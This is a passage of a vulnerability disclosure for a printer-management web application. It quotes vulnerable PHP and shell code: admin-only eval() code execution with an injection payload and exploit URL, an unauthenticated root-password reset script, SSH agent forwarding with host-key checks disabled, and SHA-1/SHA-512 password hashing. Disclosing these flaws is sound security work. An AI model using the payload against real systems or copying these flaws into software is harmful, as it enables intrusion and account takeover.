<p>I didn't complete analyzing XSS because the numbers of findings were already too big. Consequently, the provided list is not exhaustive.</p>
<p><a id="va-rce-01"></a></p>
<h2>Details - Remote Code Executions using eval() - requires administrator privileges</h2>
<p>The PHP code uses insecure <code>eval()</code> with attacker-controlled data. This allows an attacker with administrator privileges to get Remote Code Execution on the solution.</p>
<p>Content of <code>/var/www/app/admin/design/addip.php</code> - the function <code>ut()</code> will <code>eval()</code> attacker-controlled data.</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">217</span> <span style="color: #666666">&lt;?</span>php
<span style="color: #666666">218</span>    <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">ut</span>(<span style="color: #19177C">$prop</span>) {                                       <span style="color: #408080; font-style: italic">// [1] insecure ut() function</span>
<span style="color: #666666">219</span>           <span style="color: #008000; font-weight: bold">global</span> <span style="color: #19177C">$printer_dao</span>,<span style="color: #19177C">$printer_vo</span>,<span style="color: #19177C">$search_folder</span>;
<span style="color: #666666">220</span>           <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #008000">isset</span>(<span style="color: #19177C">$printer_dao</span>)) {
<span style="color: #666666">221</span>                         <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&lt;div class=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">ip-current-val</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&quot;</span>;
<span style="color: #666666">222</span>                         <span style="color: #008000; font-weight: bold">eval</span>(<span style="color: #BA2121">&quot;echo escape_html(&quot;</span><span style="color: #666666">.</span><span style="color: #19177C">$prop</span><span style="color: #666666">.</span><span style="color: #BA2121">&quot;);&quot;</span>); <span style="color: #408080; font-style: italic">// [2] a wild eval() appears!</span>
<span style="color: #666666">223</span>                         <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&lt;/div&gt;&quot;</span>;
<span style="color: #666666">224</span>           }
<span style="color: #666666">225</span>    }
[<span style="color: #666666">...</span>]
<span style="color: #666666">253</span>                     <span style="color: #666666">&lt;?</span>php ut(<span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\$</span><span style="color: #BA2121">printer_vo-&gt;str_title&quot;</span>); <span style="color: #BC7A00">?&gt;</span>   // [3] call to ut() with attacker-controlled data
254                     &lt;/div&gt;
255                     &lt;div class=&quot;form-field&quot;&gt;
256                 &lt;label class=&quot;ff-label&quot; for=&quot;IPAddress&quot;&gt;IP Address or Hostname:&lt;/label&gt;
257                 &lt;br/&gt;&lt;input maxlength=&quot;128&quot; type=&#39;text&#39; id=&#39;IPAddress&#39; name=&#39;IPAddress&#39; class=&quot;full-width-textbox&quot;
258                     value=&quot;<span style="color: #BC7A00">&lt;?php</span> <span style="color: #008000; font-weight: bold">echo</span> escape_attr_html(<span style="color: #19177C">$def_hostaddress</span>); <span style="color: #BC7A00">?&gt;</span>&quot; onKeyDown=&quot;return helper.handle_special_input(event,&#39;add_ip_close&#39;);&quot; /&gt;
259                 <span style="color: #BC7A00">&lt;?php</span> ut(<span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\$</span><span style="color: #BA2121">printer_vo-&gt;str_host_address&quot;</span>); <span style="color: #BC7A00">?&gt;</span> // [4] call to ut() with attacker-controlled data
[...]
319                     <span style="color: #BC7A00">&lt;?php</span> ut(<span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\$</span><span style="color: #BA2121">printer_vo-&gt;str_comment&quot;</span>); <span style="color: #BC7A00">?&gt;</span>  // [5] call to ut() with attacker-controlled data
[...]
344                     <span style="color: #BC7A00">&lt;?php</span> ut(<span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\$</span><span style="color: #BA2121">search_folder&quot;</span>); <span style="color: #BC7A00">?&gt;</span>            // [6] call to ut() with attacker-controlled data
</pre></div>

<p>This code can be escaped with:</p>
<pre><code>$prop = "'a');system('ls');//"
</code></pre>
<p>Exploitation is possible using <code>/var/www/app/admin/index.php</code>. The variables stored in <code>$_SESSION</code> will be used to set the variables <code>$printer_vo-&gt;str_title</code>, <code>$printer_vo-&gt;str_host_address</code>, <code>$printer_vo-&gt;str_comment</code> and <code>$search_folder</code> in <code>/var/www/app/admin/design/addip.php</code>.</p>
<p>Content of <code>/var/www/app/admin/index.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">49</span> <span style="color: #008000; font-weight: bold">if</span>((requestint(<span style="color: #BA2121">&#39;adddirectip&#39;</span>,<span style="color: #666666">0</span>)<span style="color: #666666">==1</span>)<span style="color: #666666">||</span>
 <span style="color: #666666">50</span>   (requestint(<span style="color: #BA2121">&#39;updatedirectip&#39;</span>,<span style="color: #666666">0</span>)<span style="color: #666666">==1</span>))
 <span style="color: #666666">51</span> {
 <span style="color: #666666">52</span>         <span style="color: #666666">@</span><span style="color: #008000">session_start</span>();
 <span style="color: #666666">53</span>         <span style="color: #19177C">$_SESSION</span>[<span style="color: #BA2121">&#39;preserve&#39;</span>][<span style="color: #BA2121">&#39;addip&#39;</span>]<span style="color: #666666">=</span>(requestint(<span style="color: #BA2121">&#39;adddirectip&#39;</span>,<span style="color: #666666">0</span>)<span style="color: #666666">==1</span>)<span style="color: #666666">?1:2</span>;
 <span style="color: #666666">54</span>         <span style="color: #19177C">$_SESSION</span>[<span style="color: #BA2121">&#39;preserve&#39;</span>][<span style="color: #BA2121">&#39;folder&#39;</span>]<span style="color: #666666">=</span>requeststr(<span style="color: #BA2121">&#39;folder&#39;</span>);
 <span style="color: #666666">55</span>         <span style="color: #19177C">$_SESSION</span>[<span style="color: #BA2121">&#39;preserve&#39;</span>][<span style="color: #BA2121">&#39;printername&#39;</span>]<span style="color: #666666">=</span>requeststr(<span style="color: #BA2121">&#39;printername&#39;</span>);
 <span style="color: #666666">56</span>         <span style="color: #19177C">$_SESSION</span>[<span style="color: #BA2121">&#39;preserve&#39;</span>][<span style="color: #BA2121">&#39;hostaddress&#39;</span>]<span style="color: #666666">=</span>requeststr(<span style="color: #BA2121">&#39;hostaddress&#39;</span>);
 <span style="color: #666666">57</span>         <span style="color: #19177C">$_SESSION</span>[<span style="color: #BA2121">&#39;preserve&#39;</span>][<span style="color: #BA2121">&#39;location&#39;</span>]<span style="color: #666666">=</span>requeststr(<span style="color: #BA2121">&#39;location&#39;</span>);
 <span style="color: #666666">58</span>         <span style="color: #19177C">$_SESSION</span>[<span style="color: #BA2121">&#39;preserve&#39;</span>][<span style="color: #BA2121">&#39;comment&#39;</span>]<span style="color: #666666">=</span>requeststr(<span style="color: #BA2121">&#39;comment&#39;</span>);
 <span style="color: #666666">59</span>         <span style="color: #19177C">$_SESSION</span>[<span style="color: #BA2121">&#39;preserve&#39;</span>][<span style="color: #BA2121">&#39;iscolor&#39;</span>]<span style="color: #666666">=</span>requeststr(<span style="color: #BA2121">&#39;iscolor&#39;</span>);
 <span style="color: #666666">60</span>         <span style="color: #19177C">$_SESSION</span>[<span style="color: #BA2121">&#39;preserve&#39;</span>][<span style="color: #BA2121">&#39;new_folder&#39;</span>]<span style="color: #666666">=</span>requeststr(<span style="color: #BA2121">&#39;new_folder&#39;</span>);
 <span style="color: #666666">61</span>         <span style="color: #19177C">$_SESSION</span>[<span style="color: #BA2121">&#39;preserve&#39;</span>][<span style="color: #BA2121">&#39;new_printername&#39;</span>]<span style="color: #666666">=</span>requeststr(<span style="color: #BA2121">&#39;new_printername&#39;</span>);
 <span style="color: #666666">62</span> 
 <span style="color: #666666">63</span>         <span style="color: #666666">@</span><span style="color: #008000">session_write_close</span>();
 <span style="color: #666666">64</span>         <span style="color: #008000">header</span>(<span style="color: #BA2121">&#39;location: &#39;</span><span style="color: #666666">.</span>remove_relative(ABSURL<span style="color: #666666">.</span><span style="color: #BA2121">&quot;admin/&quot;</span>));
 <span style="color: #666666">65</span>         <span style="color: #008000; font-weight: bold">return</span>;
 <span style="color: #666666">66</span> }
</pre></div>

<p>A possible url is: <code>http://10.105.0.241/admin/index.php?updatedirectip=1&amp;folder=NOP&amp;printername=TEST&amp;hostaddress=POC&amp;location=Location&amp;comment=Comment&amp;iscolor=Color&amp;new_folder=new_fold&amp;new_printername=New_name</code>.</p>
<p>I found other calls to <code>eval()</code> but their exploitations are not trivial and will require more time to analyse the execution flow.</p>
<p>An attacker with admin privileges can execute code on the solution.</p>
<p><a id="va-dead-code"></a></p>
<h2>Details - Dangerous PHP dead code</h2>
<p>It was observed that some PHP dead codes exist in the solution.</p>
<p>For example, <code>/web/www/app/resetroot.php</code> inside several Docker instances - including Docker instances executing PHP code - is a PHP script that doesn't check authentication and that will change the password of the mysql root user to <code>password</code>.</p>
<p>On lines 6 to 10, it appears the verification of the IP has been commented.</p>
<p>On lines 15 and 16, the password is redefined to <code>password</code> (<code>sha512("password") = "b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86"</code>).</p>
<p>Content of <code>/var/www/app/resetroot.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 &lt;html&gt;
  2 &lt;head&gt;
  3 &lt;/head&gt;
  4 &lt;body&gt;
  5 <span style="color: #BC7A00">&lt;?php</span>
  <span style="color: #666666">6</span> <span style="color: #408080; font-style: italic">/*if(strpos(&#39;127.0.0.1&#39;,$_SERVER[&#39;HTTP_HOST&#39;])===false) {</span>
<span style="color: #408080; font-style: italic">  7   echo &quot;This page can only be executed from a browser running on the web server, using http://127.0.0.1/&quot;;</span>
<span style="color: #408080; font-style: italic">  8 //  echo $_SERVER[&#39;HTTP_HOST&#39;];</span>
<span style="color: #408080; font-style: italic">  9   die();</span>
<span style="color: #408080; font-style: italic"> 10 }*/</span>
 <span style="color: #666666">11</span> <span style="color: #008000; font-weight: bold">require_once</span>(<span style="color: #BA2121">&quot;global.php&quot;</span>);
 <span style="color: #666666">12</span> <span style="color: #008000; font-weight: bold">require_once</span>(ABSPATH<span style="color: #666666">.</span><span style="color: #BA2121">&quot;lib/dao/dbopen.php&quot;</span>);
 <span style="color: #666666">13</span> <span style="color: #19177C">$dao</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">new</span> data_access();
 <span style="color: #666666">14</span> <span style="color: #19177C">$dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">allow_write</span>();
 <span style="color: #666666">15</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">qry</span>(<span style="color: #BA2121">&quot;UPDATE `ppp_users` SET `username` = &#39;root&#39;,</span>
<span style="color: #BA2121"> 16 my_password = &#39;b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86&#39; WHERE `ppp_users`.`user_type`=1&quot;</span>)) {
 <span style="color: #666666">17</span>   <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;The root account has been reset to &lt;br /&gt;&lt;br /&gt;username: &lt;b&gt;root&lt;/b&gt; &lt;br /&gt;password: &lt;b&gt;password&lt;/b&gt;&quot;</span>;
 <span style="color: #666666">18</span> } <span style="color: #008000; font-weight: bold">else</span> {
 <span style="color: #666666">19</span>   <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;Unable to reset root account: &quot;</span><span style="color: #666666">.</span><span style="color: #19177C">$dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">last_error</span>;
 <span style="color: #666666">20</span> }
 <span style="color: #666666">21</span>
 <span style="color: #666666">22</span> <span style="color: #BC7A00">?&gt;</span>
 23 &lt;/body&gt;
 24 &lt;/html&gt;
</pre></div>

<p><code>/var/www/app/lib/common/oses.php</code> is also very interesting:</p>
<p>Content of <code>/var/www/app/lib/common/oses.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
  <span style="color: #666666">3</span>   <span style="color: #408080; font-style: italic">//since we are suffering the overhead of sessions, we may as well used them to cache</span>
  <span style="color: #666666">4</span>   <span style="color: #408080; font-style: italic">//constantly needed data, like the os list</span>
  <span style="color: #666666">5</span>   <span style="color: #408080; font-style: italic">//this also gives a handy way of limiting the visible OSes for the logged in user which</span>
  <span style="color: #666666">6</span>   <span style="color: #408080; font-style: italic">//at some point will be different than the available oses</span>
  <span style="color: #666666">7</span>  <span style="color: #408080; font-style: italic">/* if(isset($_SESSION[&#39;osdata&#39;])) {</span>
<span style="color: #408080; font-style: italic">  8     @self::$oses_max=intval($_SESSION[&#39;osesmax&#39;]);</span>
<span style="color: #408080; font-style: italic">  9     @self::$oses=unserialize($_SESSION[&#39;osdata&#39;]); // [1] &lt;-- !</span>
<span style="color: #408080; font-style: italic"> 10   }*/</span> <span style="color: #408080; font-style: italic">//removed 4/1/2013 from all versions.  It causes too many problems when it does change.  and isn&#39;t really that much benefit</span>
 <span style="color: #666666">11</span>
</pre></div>

<p>This code will unserialize <code>$_SESSION["osdata"]</code> on line 9, resulting in a Remote Code Execution - fortunately, this code has been commented by the vendor.</p>
<p>An attacker that achieves to execute this PHP code will reset the mysql root password to <code>password</code>.</p>
<p><a id="va-insecure-ssh-config"></a></p>
<h2>Details - Insecure SSH configuration</h2>
<p>When analyzing the <code>20.0.1305.gpg</code> update file, it appears some shell scripts inside docker instances will run SSH with insecure options.</p>
<p>Forwarding SSH-Agent without checking the SSH key of the SSH server will allow an attacker to do lateral movements using the private SSH key of the developers:</p>
<p>Content of <code>./out-images/47a0cd7c12483185df274392eff25d238b60ba7589e5081bd8debef0ef9da9ef/opt/bin/stack-cmd.sh</code>:</p>
<pre>
 89 # Now run command
 90 for i in "${IPS[@]}"
 91 do
 92     # Skip blank or "not found"
 93     if [ -z "${i}" ] || [[ ${i} == *"Unable to find"* ]]; then
 94         continue
 95     fi
 96     echo -e "\n...Running on ${i}..."
 97
 98     # if CMD is a script then substitute any env vars locally and execute remotely
 99     if [ -f "${CMD}" ]; then
100         color eval "ssh -o UserKnownHostsFile=/dev/null <font color=red>-o StrictHostKeyChecking=no</font> -o LogLevel=error $i 'bash /dev/stdin' < <(cat "${CMD}" | envsubst)${ASYNC}" || exit 1
101     else
102         # else just execute CMD string on remote host
103         color eval "ssh -o UserKnownHostsFile=/dev/null <font color=red>-o StrictHostKeyChecking=no</font> -o LogLevel=error -n $i 'bash -l -c \"${CMD}\"'${ASYNC}" || exit 1
104     fi
105 done;
</pre>

<p>Content of <code>./out-images/47a0cd7c12483185df274392eff25d238b60ba7589e5081bd8debef0ef9da9ef/opt/includes/ssh.config.developers</code>:</p>
<pre>
kali% cat ./out-images/47a0cd7c12483185df274392eff25d238b60ba7589e5081bd8debef0ef9da9ef/opt/includes/ssh.config.developers
Host 10.*.*.*
    <font color=red>ForwardAgent yes
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null</font>
Host *.compute.internal
    <font color=red>ForwardAgent yes
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null</font>
kali%
</pre>

<p>These insecure options appear to be present in several Docker instances:        </p>
<pre>
kali% pwd
/home/user/printerlogic/updates/out/out-images/4ecc6d1307c1c74ddccbdc983b2fe024742ec0531265255b5730dcb5afc0fa52
kalim% rgrep -i strict .
[...]
./opt/includes/ssh.config.developers:    <font color=red>StrictHostKeyChecking no</font>
./opt/includes/ssh.config.developers:    <font color=red>StrictHostKeyChecking no</font>
[...]
./opt/bin/stack-cmd.sh:        color eval "ssh -o UserKnownHostsFile=/dev/null <font color=red>-o StrictHostKeyChecking=no</font> -o LogLevel=error $i 'bash /dev/stdin' < <(cat "${CMD}" | envsubst)${ASYNC}" || exit 1
./opt/bin/stack-cmd.sh:        color eval "ssh -o UserKnownHostsFile=/dev/null <font color=red>-o StrictHostKeyChecking=no</font> -o LogLevel=error -n $i 'bash -l -c \"${CMD}\"'${ASYNC}" || exit 1
</pre>

<p>A developer that will ssh into a compromised solution will get his ssh-agent compromised, allowing an attacker to do lateral movements.</p>
<p>The script will blindly reach SSH servers, without checking their identities.</p>
<p><a id="va-incorrect-encryption-algorithms-password"></a></p>
<h2>Details - Incorrect encryption algorithms used to store passwords</h2>
<p>It was observed that the passwords are encrypted using SHA-512 with a fall-back to SHA-1 (in <code>update_database.php</code> and <code>Login.php</code>):</p>
<p>Content of <code>/var/www/app/admin/query/server_write_requests_users.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">198</span>         <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">strlen</span>(<span style="color: #008000">trim</span>(<span style="color: #19177C">$password</span>)) <span style="color: #666666">!=</span> <span style="color: #666666">0</span>) {
<span style="color: #666666">199</span>             <span style="color: #19177C">$securepass</span> <span style="color: #666666">=</span> <span style="color: #008000">hash</span>(<span style="color: #BA2121">&#39;sha512&#39;</span>, <span style="color: #19177C">$password</span>); <span style="color: #408080; font-style: italic">// [1] use of SHA-512</span>
<span style="color: #666666">200</span>             <span style="color: #19177C">$user_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_my_password</span> <span style="color: #666666">=</span> <span style="color: #19177C">$securepass</span>;
<span style="color: #666666">201</span>         }
<span style="color: #666666">202</span>
</pre></div>

<p>Content of <code>/var/www/app/admin/query/update_database.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">74</span> <span style="color: #19177C">$sha512Password</span> <span style="color: #666666">=</span> <span style="color: #008000">hash</span>(<span style="color: #BA2121">&#39;sha512&#39;</span>, <span style="color: #BA2121">&quot;password&quot;</span>);         <span style="color: #408080; font-style: italic">// [1] use of SHA-512</span>
 <span style="color: #666666">75</span> <span style="color: #19177C">$sha1Password</span> <span style="color: #666666">=</span> <span style="color: #008000">hash</span>(<span style="color: #BA2121">&#39;sha1&#39;</span>, <span style="color: #BA2121">&quot;password&quot;</span>);             <span style="color: #408080; font-style: italic">// [2] use of SHA-1</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">86</span>     <span style="color: #408080; font-style: italic">// Check to make sure the root user has the initial email/password, so that this cant be used to change any users email/password</span>
 <span style="color: #666666">87</span>     <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$user_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_email_address</span> <span style="color: #666666">==</span> <span style="color: #BA2121">&quot;admin&quot;</span> <span style="color: #666666">&amp;&amp;</span>
 <span style="color: #666666">88</span>         (<span style="color: #19177C">$user_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_my_password</span> <span style="color: #666666">==</span> <span style="color: #19177C">$sha512Password</span> <span style="color: #666666">||</span> <span style="color: #408080; font-style: italic">// [3] use of SHA-512</span>
 <span style="color: #666666">89</span>         <span style="color: #19177C">$user_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_my_password</span> <span style="color: #666666">==</span> <span style="color: #19177C">$sha1Password</span>)) { <span style="color: #408080; font-style: italic">//   [4] fall-back to SHA-1</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">98</span>             <span style="color: #19177C">$user_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_my_password</span> <span style="color: #666666">=</span> <span style="color: #008000">hash</span>(<span style="color: #BA2121">&#39;sha512&#39;</span>, <span style="color: #19177C">$root_password</span>); <span style="color: #408080; font-style: italic">// [5] use of SHA-521</span>
</pre></div>

<p>Content of <code>/var/www/app/legacy/Login.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">426</span>         <span style="color: #19177C">$tempPass</span> <span style="color: #666666">=</span> <span style="color: #008000">hash</span>(<span style="color: #BA2121">&#39;sha512&#39;</span>, <span style="color: #19177C">$pw</span>); [<span style="color: #666666">1</span>] <span style="color: #008000; font-weight: bold">use</span> of SHA<span style="color: #666666">-512</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">440</span>             <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic"> 441              * When we switched to sha512, we need to provided temporary checking for accounts</span>
<span style="color: #BA2121; font-style: italic"> 442              * that haven&#39;t been switched yet.  Eventually, this code should be removed and any</span>
<span style="color: #BA2121; font-style: italic"> 443              * remaining users who still have an sha1 hash will have to reset their password.  At that point,</span>
<span style="color: #BA2121; font-style: italic"> 444              * however, most users should have already been converted.</span>
<span style="color: #BA2121; font-style: italic"> 445              */</span>
 <span style="color: #666666">446</span>             <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span><span style="color: #19177C">$sr</span>) {
 <span style="color: #666666">447</span>                 <span style="color: #19177C">$sha1_pass</span> <span style="color: #666666">=</span> <span style="color: #008000">sha1</span>(<span style="color: #19177C">$pw</span>);                                          <span style="color: #408080; font-style: italic">// [2] use of SHA-1</span>
 <span style="color: #666666">448</span>                 <span style="color: #19177C">$sr</span> <span style="color: #666666">=</span> <span style="color: #19177C">$user_dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">find_by_login</span>(<span style="color: #19177C">$username</span>, <span style="color: #19177C">$sha1_pass</span>, <span style="color: #19177C">$user_vo</span>); <span style="color: #408080; font-style: italic">// [3] use of SHA-1</span>
 <span style="color: #666666">449</span>                 <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$sr</span>) {
 <span style="color: #666666">450</span>                     <span style="color: #408080; font-style: italic">/*    Convert their password to sha512    */</span>
 <span style="color: #666666">451</span>                     <span style="color: #19177C">$user_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_my_password</span> <span style="color: #666666">=</span> <span style="color: #19177C">$tempPass</span>;                       <span style="color: #408080; font-style: italic">// [3] migration to SHA-521</span>
 <span style="color: #666666">452</span>                     <span style="color: #19177C">$user_dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">allow_write</span>();
 <span style="color: #666666">453</span>                     <span style="color: #19177C">$user_dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">save</span>(<span style="color: #19177C">$user_vo</span>);
 <span style="color: #666666">454</span>                 }<span style="color: #408080; font-style: italic">//end if</span>
 <span style="color: #666666">455</span>             }<span style="color: #408080; font-style: italic">//end if</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">1147</span>         <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span><span style="color: #19177C">$user_dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">find_by_login</span>(<span style="color: #19177C">$username</span>, <span style="color: #19177C">$tempPass</span>, <span style="color: #19177C">$user_vo</span>)) {
<span style="color: #666666">1148</span>             <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">1149              * When we switched to sha512, we need to provided temporary checking for accounts</span>
<span style="color: #BA2121; font-style: italic">1150              * that haven&#39;t been switched yet.  Eventually, this code should be removed and any</span>
<span style="color: #BA2121; font-style: italic">1151              * remaining users who still have an sha1 hash will have to reset their password.  At that point,</span>
<span style="color: #BA2121; font-style: italic">1152              * however, most users should have already been converted.</span>
<span style="color: #BA2121; font-style: italic">1153              */</span>
<span style="color: #666666">1154</span>             <span style="color: #19177C">$sha1_pass</span> <span style="color: #666666">=</span> <span style="color: #008000">sha1</span>(<span style="color: #19177C">$pw</span>);
<span style="color: #666666">1155</span>             <span style="color: #19177C">$sr</span> <span style="color: #666666">=</span> <span style="color: #19177C">$user_dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">find_by_login</span>(<span style="color: #19177C">$username</span>, <span style="color: #19177C">$sha1_pass</span>, <span style="color: #19177C">$user_vo</span>);     <span style="color: #408080; font-style: italic">// [4] use of SHA-1</span>
<span style="color: #666666">1156</span>             <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$sr</span>) {
<span style="color: #666666">1157</span>                 <span style="color: #408080; font-style: italic">/*    Convert their password to sha512    */</span>
<span style="color: #666666">1158</span>                 <span style="color: #19177C">$user_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_my_password</span> <span style="color: #666666">=</span> <span style="color: #19177C">$tempPass</span>;                           <span style="color: #408080; font-style: italic">// [5] migration to SHA-512</span>
<span style="color: #666666">1159</span>                 <span style="color: #19177C">$user_dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">allow_write</span>();
<span style="color: #666666">1160</span>                 <span style="color: #19177C">$user_dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">save</span>(<span style="color: #19177C">$user_vo</span>);
<span style="color: #666666">1161</span>             } <span style="color: #008000; font-weight: bold">else</span> {
<span style="color: #666666">1162</span>                 <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">last_error</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;The username or password is incorrect.&quot;</span>;
<span style="color: #666666">1163</span>                 <span style="color: #008000; font-weight: bold">return</span> <span style="color: #008000; font-weight: bold">null</span>;
<span style="color: #666666">1164</span>             }
</pre></div>

<p>Content of <code>/var/www/app/tests/Unit/Api/IdP/IdpControllerTest.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">443</span>         <span style="color: #19177C">$hashString</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;PrinterLogicIdpAuthentication</span><span style="color: #BB6688; font-weight: bold">{</span><span style="color: #19177C">$mockDateTimeString</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span>;
<span style="color: #666666">444</span>         <span style="color: #19177C">$hash</span> <span style="color: #666666">=</span> <span style="color: #008000">hash</span>(<span style="color: #BA2121">&#39;sha512&#39;</span>, <span style="color: #19177C">$hashString</span>);                                      <span style="color: #408080; font-style: italic">// [1] use of SHA-512</span>
<span style="color: #666666">445</span> 
<span style="color: #666666">446</span>         <span style="color: #408080; font-style: italic">//Act</span>
<span style="color: #666666">447</span>         <span style="color: #19177C">$apiResponse</span> <span style="color: #666666">=</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">json</span>(
<span style="color: #666666">448</span>             <span style="color: #BA2121">&#39;GET&#39;</span>,
<span style="color: #666666">449</span>             <span style="color: #BA2121">&quot;/api/idp&quot;</span>,
<span style="color: #666666">450</span>             [],
<span style="color: #666666">451</span>             [
<span style="color: #666666">452</span>                 <span style="color: #BA2121">&#39;x-printerlogic-hash&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$hash</span>,
<span style="color: #666666">453</span>                 <span style="color: #BA2121">&#39;x-printerlogic-datetime&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$mockDateTimeString</span>
<span style="color: #666666">454</span>             ]
<span style="color: #666666">455</span>         );
</pre></div>

<p>Interestingly, a custom implementation of PBKDF2-HMAC-SHA512 can be found inside <code>/var/www/app/legacy/Security/Crypt.php</code>, but the code is not used to store passwords. This implementation seems to have been copied from <a href="https://www.php.net/manual/en/function.hash-pbkdf2.php#118301">https://www.php.net/manual/en/function.hash-pbkdf2.php#118301</a> and doesn't seem to be compatible with the original PBKDF2-HMAC-SHA512 implementation. The execution flow is shown below:</p>
<p>Content of <code>/var/www/app/legacy/Security/Crypt.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">269</span>     <span style="color: #008000; font-weight: bold">protected</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">getKeys</span>(<span style="color: #19177C">$salt</span>, <span style="color: #19177C">$key</span>)
<span style="color: #666666">270</span>     {
<span style="color: #666666">271</span>         <span style="color: #19177C">$ivSize</span> <span style="color: #666666">=</span> <span style="color: #008000">openssl_cipher_iv_length</span>(<span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">cipher</span>);
<span style="color: #666666">272</span>         <span style="color: #19177C">$keySize</span> <span style="color: #666666">=</span> <span style="color: #666666">256</span>;
<span style="color: #666666">273</span>         <span style="color: #19177C">$length</span> <span style="color: #666666">=</span> <span style="color: #666666">2</span> <span style="color: #666666">*</span> <span style="color: #19177C">$keySize</span> <span style="color: #666666">+</span> <span style="color: #19177C">$ivSize</span>;
<span style="color: #666666">274</span> 
<span style="color: #666666">275</span>         <span style="color: #19177C">$key</span> <span style="color: #666666">=</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">pbkdf2</span>(<span style="color: #BA2121">&#39;sha512&#39;</span>, <span style="color: #19177C">$key</span>, <span style="color: #19177C">$salt</span>, <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">rounds</span>, <span style="color: #19177C">$length</span>);
[<span style="color: #666666">...</span>]
